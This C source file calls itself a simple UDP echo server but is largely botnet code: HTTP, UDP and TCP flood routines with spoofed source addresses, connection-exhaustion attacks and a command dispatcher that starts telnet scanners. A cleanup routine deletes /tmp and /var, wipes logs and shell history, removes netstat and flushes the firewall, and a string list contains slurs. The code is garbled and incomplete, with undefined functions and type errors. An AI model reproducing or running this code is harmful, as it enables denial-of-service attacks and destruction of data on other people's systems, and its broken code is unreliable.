/* 
 * udpserver.c - A simple UDP echo server 
 * usage: udpserver <port>
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <netdb.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>



#define MAKE128CONST(hi,lo) ((((__uint128_t)hi << 64) | lo))


#define MAXCLIENTS 65535
#define BUFSIZE 65500

/*
 * error - wrapper for perror
 */
 
void error(char *msg) {
  perror(msg);
  exit(1);
}
void RemoveTMP() {
system("rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
system("rm -rf /var/log/wtmp");
system("history -c;history -w");
system("rm -rf /var/log/wtmp");
system("rm -rf /tmp/*");
system("history -c");
system("rm -rf ~/.bash_history");
system("rm -rf /bin/netstat");
system("history -w");
system("pkill -9 busybox");
system("pkill -9 perl");
system("service iptables stop");
system("/sbin/iptables -F;/sbin/iptables -X");
}
int socket_connect(char *host, in_port_t port) {
struct hostent *hp;
struct sockaddr_in addr;
int on = 1, sock;
if ((hp = gethostbyname(host)) == NULL) return 0;
bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
addr.sin_port = htons(port);
addr.sin_family = AF_INET;
sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
if (sock == -1) return 0;
if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
return 0;
return sock;
}
void sendHTTP(void *host, char *method, in_port_t port, char *path, int timeFoo, int power) {
const char *useragents[] = {
"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Opera/6.04 (Windows XP; U) [en]",
"Opera/9.99 (X11; U; sk)",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Mozilla/5.0 (PLAYSTATION 3; 3.55)",
"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
"wii libnup/1.0",
"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
"PSP (PlayStation Portable); 2.00",
"Bunjalloo/0.7.6(Nintendo DS;U;en)",
"Doris/1.15 [en] (Symbian)",
"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100"
"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)"
"AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)"
};
const char *connections[] = {"close", "keep-alive", "accept"};
int i, timeEnd = time(NULL) + timeFoo;
char request[512];
sprintf(request, "%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", method, path, connections[(rand() % 3)], useragents[(rand() % 65)]);
for (i = 0; i < power; i++) {
if (fork()) {
while (timeEnd > time(NULL)) {
int socket = socket_connect((char *)host, port);
if (socket != 0) {
write(socket, request, strlen(request));
close(socket);
}
}
_exit(1);
}
}
}
void sendSTD(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"arfgG", "HBiug655", "KJYDFyljf754", "LIKUGilkut769458905", "JHFDSkgfc5747694", "GJjyur67458", "RYSDk747586", "HKJGi5r8675", "KHGK7985i", "yuituiILYF", "GKJDghfcjkgd4", "uygtfgtrevf", "tyeuhygbtfvg", "ewqdcftr", "trbazetghhnbrty", "tbhrwsehbg", "twehgbferhb", "etrbhhgetrb", "edfverthbyrtb", "kmiujmnhnhfgn", "zcdbvgdfsbgfd", "gdfbtsdgb", "ghdugffytsdyt", "tgerthgwtrwry", "yteytietyue", "qsortEQS", "8969876hjkghblk", "std", "dts", "hackz", "shdyed", "http", "sghwiondc", "nigger", "pussy", "faggot"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}
a = 0;
}
a++;
}
}
void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
register unsigned int pollRegister;
pollRegister = pollinterval;
if(spoofit == 32)
{
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd)
{
HackerPrint(D1ckSucka, "Failed opening raw socket.");
return;
}
unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
if(buf == NULL) return;
memset(buf, 0, packetsize + 1);
makeRandomStr(buf, packetsize);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
while(1)
{
sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
if(i == pollRegister)
{
if(port == 0) dest_addr.sin_port = rand_cmwc();
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
}
} else {
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
if(!sockfd)
{
HackerPrint(D1ckSucka, "Failed opening raw socket.");
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
{
HackerPrint(D1ckSucka, "Failed setting raw headers mode.");
return;
}
int counter = 50;
while(counter--)
{
srand(time(NULL) ^ rand_cmwc());
init_rand(rand());
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( HackerScan2(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
udph->len = htons(sizeof(struct udphdr) + packetsize);
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
udph->check = 0;
makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
while(1)
{
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
iph->id = rand_cmwc();
iph->saddr = htonl( HackerScan2(netmask) );
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister)
{
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
}
}
}
void sendCNC(unsigned char *ip,int port, int end_time)
{
int end = time(NULL) + end_time;
int sockfd;
struct sockaddr_in server;
server.sin_addr.s_addr = inet_addr(ip);
server.sin_family = AF_INET;
server.sin_port = htons(port);
while(end > time(NULL))
{
sockfd = socket(AF_INET, SOCK_STREAM, 0);
connect(sockfd , (struct sockaddr *)&server , sizeof(server));
sleep(1);
close(sockfd);
}
}
void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
register unsigned int pollRegister;
pollRegister = pollinterval;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
if(!sockfd)
{
HackerPrint(D1ckSucka, "Failed opening raw socket.");
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
{
HackerPrint(D1ckSucka, "Failed setting raw headers mode.");
return;
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( HackerScan2(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
tcph->source = rand_cmwc();
tcph->seq = rand_cmwc();
tcph->ack_seq = 0;
tcph->doff = 5;
if(!strcmp(flags, "all"))
{
tcph->syn = 1;
tcph->rst = 1;
tcph->fin = 1;
tcph->ack = 1;
tcph->psh = 1;
} else {
unsigned char *pch = strtok(flags, ",");
while(pch)
{
if(!strcmp(pch, "syn"))
{
tcph->syn = 1;
} else if(!strcmp(pch, "rst"))
{
tcph->rst = 1;
} else if(!strcmp(pch, "fin"))
{
tcph->fin = 1;
} else if(!strcmp(pch, "ack"))
{
tcph->ack = 1;
} else if(!strcmp(pch, "psh"))
{
tcph->psh = 1;
} else {
HackerPrint(D1ckSucka, "Invalid flag \"%s\"", pch);
}
pch = strtok(NULL, ",");
}
}
tcph->window = rand_cmwc();
tcph->check = 0;
tcph->urg_ptr = 0;
tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
tcph->check = tcpcsum(iph, tcph);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
while(1)
{
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
iph->saddr = htonl( HackerScan2(netmask) );
iph->id = rand_cmwc();
tcph->seq = rand_cmwc();
tcph->source = rand_cmwc();
tcph->check = 0;
tcph->check = tcpcsum(iph, tcph);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister)
{
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
}
}
void sendJUNK(unsigned char *ip, int port, int end_time)
{
int max = getdtablesize() / 2, i;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if(getHost(ip, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
struct state_t
{
int fd;
uint8_t state;
} fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
fd_set myset;
struct timeval tv;
socklen_t lon;
int valopt, res;
unsigned char *watwat = malloc(1024);
memset(watwat, 0, 1024);
int end = time(NULL) + end_time;
while(end > time(NULL))
{
for(i = 0; i < max; i++)
{
switch(fds[i].state)
{
case 0:
{
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
else fds[i].state = 1;
}
break;
case 1:
{
FD_ZERO(&myset);
FD_SET(fds[i].fd, &myset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
if(res == 1)
{
lon = sizeof(int);
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt)
{
close(fds[i].fd);
fds[i].state = 0;
} else {
fds[i].state = 2;
}
} else if(res == -1)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
case 2:
{
makeRandomStr(watwat, 1024);
if(send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
}
}
}
}
void sendHOLD(unsigned char *ip, int port, int end_time)
{
int max = getdtablesize() / 2, i;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if(getHost(ip, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
struct state_t
{
int fd;
uint8_t state;
} fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
fd_set myset;
struct timeval tv;
socklen_t lon;
int valopt, res;
unsigned char *watwat = malloc(1024);
memset(watwat, 0, 1024);
int end = time(NULL) + end_time;
while(end > time(NULL))
{
for(i = 0; i < max; i++)
{
switch(fds[i].state)
{
case 0:
{
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
else fds[i].state = 1;
}
break;
case 1:
{
FD_ZERO(&myset);
FD_SET(fds[i].fd, &myset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
if(res == 1)
{
lon = sizeof(int);
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt)
{
close(fds[i].fd);
fds[i].state = 0;
} else {
fds[i].state = 2;
}
} else if(res == -1)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
case 2:
{
FD_ZERO(&myset);
FD_SET(fds[i].fd, &myset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
if(res != 0)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
}
}
}
}
void processCmd(int argc, unsigned char *argv[])
{
int x;
if(!strcmp(argv[0], "PING"))
{
HackerPrint(D1ckSucka, "PONG!");
return;
}
if(!strcmp(argv[0], "GETLOCALIP"))
{
HackerPrint(D1ckSucka, "My IP: %s", inet_ntoa(ourIP));
return;
}
if(!strcmp(argv[0], "BOTKILLJFJS9D"))
{
if(!listFork())
{
HackerPrint(D1ckSucka, "Killing BotDKDHFs");
botkiller();
RemoveTMP();
_exit(0);
}
}
if(!strcmp(argv[0], "LOOPME"))
{
if(!listFork())
{
HackerPrint(D1ckSucka, "LOOPING PAYLOAD");
LoopPayload();
_exit(0);
}
}
if(!strcmp(argv[0], "TELNET"))
{
if(argc != 2)
{
HackerPrint(D1ckSucka, "TELNET ON | OFF");
return;
}
if(!strcmp(argv[1], "OFF"))
{
if(scanPid == 0) return;
kill(scanPid, 9);
HackerPrint(D1ckSucka, " OFF");
scanPid = 0;
}
if(!strcmp(argv[1], "ON"))
{
if(scanPid != 0) return;
uint32_t parent;
parent = fork();
if (parent > 0) { scanPid = parent; return;}
else if(parent == -1) return;
StartTheLelz();
_exit(0);
}
}

if(!strcmp(argv[0], "NETIS"))
{
if(argc != 2)
{
return;
}
if(!strcmp(argv[1], "ON"))
{
HackerPrint(D1ckSucka, "[NETIS] SCANNER Starting");
StartTheNetis();
_exit(0);
}
}

if(!strcmp(argv[0], "HOLD"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendHOLD(hi, port, time);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendHOLD(ip, port, time);
_exit(0);
}
}
if(!strcmp(argv[0], "JUNK"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendJUNK(hi, port, time);
close(D1ckSucka);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendJUNK(ip, port, time);
_exit(0);
}
}
if(!strcmp(argv[0], "UDP"))
{
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
int spoofed = atoi(argv[4]);
int packetsize = atoi(argv[5]);
int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendUDP(hi, port, time, spoofed, packetsize, pollinterval);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendUDP(ip, port, time, spoofed, packetsize, pollinterval);
_exit(0);
}
}
if (!strcmp((const char *)argv[0], "HTTP")) {
if (argc < 6)
{
return;
}
if (strstr((const char *)argv[1], ",") != NULL) {
unsigned char *hi = (unsigned char *)strtok((char *)argv[1], ",");
while (hi != NULL) {
if (!listFork()) {
sendHTTP((char*)argv[1], (char*)argv[2], atoi((char*)argv[3]), (char*)argv[4], atoi((char*)argv[5]), atoi((char*)argv[6]));
_exit(0);
}
hi = (unsigned char *)strtok(NULL, ",");
}
} else {
if (listFork()) {
return;
}
sendHTTP((char*)argv[1], (char*)argv[2], atoi((char*)argv[3]), (char*)argv[4], atoi((char*)argv[5]), atoi((char*)argv[6]));
_exit(0);
}
}
if(!strcmp(argv[0], "CNC"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendCNC(hi, port, time);
close(D1ckSucka);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendCNC(ip, port, time);
_exit(0);
}
}
}
char **exox;
void interpret(char *command){
/* get the first token */
    exox = strtok(command, s);
   int iscmd,argc = 0;
   /* walk through other tokens */
   while( exox != NULL ) {
      printf( " %s\n", exox );
    
      exox = strtok(NULL, s);
   
      if(exox[0][0]=="!"&&(exox[0][1]=="*"){
      	iscmd=1;
          printf("received command string: \"%s\"", exox[1]);
          continue;
  	}
  	if(iscmd){
  	    interpret(exox);
  
  	}
	}
}
#define SOTYPE AF_INET
char buf[65500] = "\0";
int main(int argc, char **argv) {
	
    struct addrinfo hints = {0}, *addrs;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = 0;

    int rval = getaddrinfo("whatismyip.akamai.com", "80", &hints, &addrs);
    if (rval != 0) {
        fprintf(stderr,"getaddrinfo failed: %s\n", gai_strerror(rval));
        return 1;
    }

    int s = socket(addrs->ai_family, addrs->ai_socktype, addrs->ai_protocol);
    if (s == -1) {
        perror("socket failed");
        return 1;
    }
    rval = connect(s, addrs->ai_addr, addrs->ai_addrlen);
    if (rval == -1) {
        perror("connect failed");
        return 1;
    }

    char cmd[] = "GET / HTTP/1.1\nHost: whatismyip.akamai.com\n\n";
    rval = send(s, cmd, strlen(cmd), 0);
    if (rval == -1) {
        perror("send failed");
        return 1;
    }

    
    rval = recv(s, buf, sizeof(buf), 0);
    if (rval == -1) {
        perror("recv failed");
        return 1;
    }
    printf("response: %s\n", buf);

    char *start = buf, *end;
    end = strchr(start, '\n');
    if (!strncmp(start, "HTTP/1.1 200 OK", end - start - 1)) {
        while (!(end[1] == '\r' && end[2] == '\n')) {
            start = end + 2;
            end = strchr(start, '\n');
        }
        start = end + 3;
        end = strchr(start, '\n');
        if (end) *end = 0;
        printf("my IP: %s\n", start);
        
    } else {
        printf("request failed\n");
    }

    close(s);
    freeaddrinfo(addrs);
  int sockfd; /* socket */
  uint16_t portno; /* port to listen on */
  int clientlen; /* byte size of client's address */
  uint16_t serSockDes; //server socket descriptor
  struct sockaddr_in serveraddr; /* server's addr */
  struct sockaddr_in clientaddr; /* client addr */
  struct sockaddr_in clients;
  struct hostent *hostp; /* client host info */
  struct sockaddr* serAddr;
  char buf[BUFSIZE]; /* message buf */
  char *hostaddrp; /* dotted decimal host addr string */
  char *command;
  char *msg;
  int optval; /* flag value for setsockopt */
  int n; /* message byte size */
  struct sockadd_in *cliAddr;
  int cliAddrLen;
  typedef struct {
    char ty; // internet type (ipv4 or ipv6)
    #if (SOTYPE==AF_INET)
    uint32_t ipv4; // ipv4 value
    #else
    void *ipv6 = MAKE128CONST(64,64);; // ipv6 value
    #endif
    uint16_t port; // port
    uint64_t hcount; // respond back packet/hit counter
    char *host; // host string
    char *command;
  } client_t;
  char buff[65507]="\0";
  char *cfile = "clients";
  
  if (argc != 2) {
    fprintf(stderr, "usage: %s <port>\n", argv[0]);
    exit(1);
  }
 
  portno = (uint16_t)atoi(argv[1]);
  
  sockfd = socket(SOTYPE, SOCK_DGRAM, 0);
  if (sockfd < 0) 
    error("ERROR opening socket");

  
  optval = 1;
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, 
	     (const void *)&optval , sizeof(int));

  
  bzero((char *) &serveraddr, sizeof(serveraddr));
  serveraddr.sin_family = SOTYPE;
  serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
  serveraddr.sin_port = htons((unsigned short)portno);

  
  if (bind(sockfd, (struct sockaddr *) &serveraddr, 
	   sizeof(serveraddr)) < 0) 
    error("ERROR on binding");

  int scout=0;
  clientlen = sizeof(clientaddr);
  while (1) {
    if(scout){
    	sockfd = socket(SOTYPE, SOCK_DGRAM, 0);
        if (sockfd < 0) 
            error("ERROR opening socket");
        sockfd.sin_addr=rand();
      //  sendto(sockfd, 
    }
    bzero(buf, BUFSIZE);
    n = recvfrom(sockfd, buf, BUFSIZE, 0,
		 (struct sockaddr *) &clientaddr, &clientlen);
    if (n < 0)
      error("ERROR in recvfrom");

    /* 
     * gethostbyaddr: determine who sent the datagram
     */
    hostp = gethostbyaddr((const char *)&clientaddr.sin_addr.s_addr, 
			  sizeof(clientaddr.sin_addr.s_addr), SOTYPE);
    if (hostp == NULL)
      error("ERROR on gethostbyaddr");
    client_t records[MAXCLIENTS];
    size_t count = 0;
    
    FILE *ihandle = fopen(cfile,"a+");
    #if (SOTYPE==AF_INET)
    memcpy((void*)clientaddr.sin_addr.s_addr, &records[count].ipv4, sizeof(clientaddr.sin_addr.s_addr));
    fprintf(ihandle,"%c\1%d\1%hd\1%s\1%s\n", &records[count].ty, &records[count].ipv4, &records[count].port, &records[count].host, &command);
    #elif (SOTYPE==AF_INET6)
    memcpy((void*)clientaddr.sin_addr.s_addr, &records[count].ipv6, sizeof(clientaddr.sin_addr.s_addr));
    fprintf(ihandle,"%c\1%d\1%hd\1%s\1%s\n", &records[count].ty, &records[count].ipv6, &records[count].port, &records[count].host, &command);
    #endif
    count++;
    fclose(ihandle);
    printf("atlas received datagram from %s (%s): %s\n", 
	   hostp->h_name, hostaddrp, command);
    printf("atlas received %d/%d bytes: %s\n", strlen(buf), n, buf);
    FILE *fp;
    
    fp = fopen(cfile, "r");
    if (fp == NULL) {
        fprintf(stderr, "Error reading file\n");
    } else {
    	#if (SOTYPE==AF_INET)
        while (fscanf(fp, "%c\1%d\1%hd\1%s\1%s\n", &records[count].ty, &records[count].ipv4, &records[count].port, &records[count].host, &command) == 2) {
            interpret(command);
            count++;
        }
        #elif (SOTYPE==AF_INET6)
        while (fscanf(fp, "%c\1%d\1%hd\1%s\n", &records[count].ty, &records[count].ipv6, &records[count].port, &records[count].host, &command) == 2) {
            interpret(command);
            count++;
        }
        #endif
